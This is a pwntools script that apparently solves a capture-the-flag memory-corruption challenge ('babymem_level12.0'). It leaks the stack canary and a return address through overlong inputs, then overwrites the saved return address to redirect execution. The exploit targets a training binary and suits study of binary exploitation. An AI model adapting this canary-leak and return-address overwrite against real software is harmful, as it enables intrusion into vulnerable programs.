from pwn import *

p = process("/challenge/babymem_level12.0")
p.sendline(b"122")
ret_addr = 0x17CC
s=b"REPEATAA" + b"A"*(0x40) + b"A"
p.send(s)
while True:
    cont = p.recvline()
    if cont.find(b"REPEATAA")!=-1:
        break
start = cont.find(b"REPEATAA")
cookie = bytearray(cont[start + 0x48: start + 0x50])
cookie[0] = b'\x00'[0]
icookie = int.from_bytes(cookie, "little")
print(icookie)

p.sendline(b"122")
s=b"REPEATAA" + b"A"*(0x50)
p.send(s)
while True:
    cont = p.recvline()
    if cont.find(b"REPEATAA")!=-1:
        break
start = cont.find(b"REPEATAA")
org_ret = bytearray(cont[start + 0x58: start + 0x5e])

org_ret = int.from_bytes(org_ret, "little")
ret_addr = org_ret - 0x2073 + ret_addr
print(org_ret)

s = b"A"*0x48 + cookie + b"A"*0x8 + ret_addr.to_bytes(8,"little")
p.sendline(b"122")
p.send(s)
all = p.recvall()
print(all.decode(errors="ignore"))
p.close()
